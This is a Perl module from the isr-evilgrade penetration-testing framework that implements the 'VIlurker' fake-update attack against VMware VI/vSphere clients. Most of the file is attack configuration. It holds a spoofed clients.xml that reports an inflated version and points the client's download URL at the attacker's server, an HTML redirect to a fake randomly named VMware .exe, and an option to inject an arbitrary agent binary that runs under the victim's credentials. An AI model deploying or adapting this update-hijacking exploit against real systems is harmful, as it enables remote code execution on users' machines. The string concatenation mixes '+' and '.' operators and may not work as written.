###############
# vmware.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::vmware;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'VMware Server',
    'appver'      => '<= 2.0.0',
    'version'     => '1.0',
    'author'      => ['Claudio Criscione < claudio +[AT]+ criscio.net >'],
    'description' => qq{VIlurker VIclient attack
            This module performs the VIlurker attack against
                        a Virtual Infrastructure or VSphere client.
                        The VI client will be tricked into downloading
                        a fake update which will be run under the user's credentials.},
    'vh'      => '',
    'request' => [
        {   'req'    => '/download/vi/index.html',  #regex friendly
            'type'   => 'string',                   #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 0,
            'string' =>
                '<html><script>window.location="http://www.vmware.com/vmware<%RND1%>.exe"</script></html>',
            'parse' => 1,
            'file'  => '',
        },

        {   'req'    => '/client/clients.xml',      #regex friendly
            'type'   => 'string',                   #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 0,
                  'string' => "<ConfigRoot>\r\n"
                . "<clientConnection id=\"0000\">\r\n"
                . "<authdPort>902</authdPort>\r\n"
                . "<version>10</version>\r\n"
                . "<patchVersion>10.0.0</patchVersion>\r\n"
                +    #using a static, high version
                "<apiVersion>10.0.0</apiVersion>\r\n"
                + "<downloadUrl>https://*/client/VMware-viclient.exe</downloadUrl>\r\n"
                .    #client autoconnects to us
                "</clientConnection>\r\n" . "</ConfigRoot>\r\n",
            'parse' => 1,
            'file'  => '',
        },

        {   'req'    => '.exe',     #regex friendly
            'type'   => 'agent',    #file|string|agent|install
            'method' => '',         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1,
        },

    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
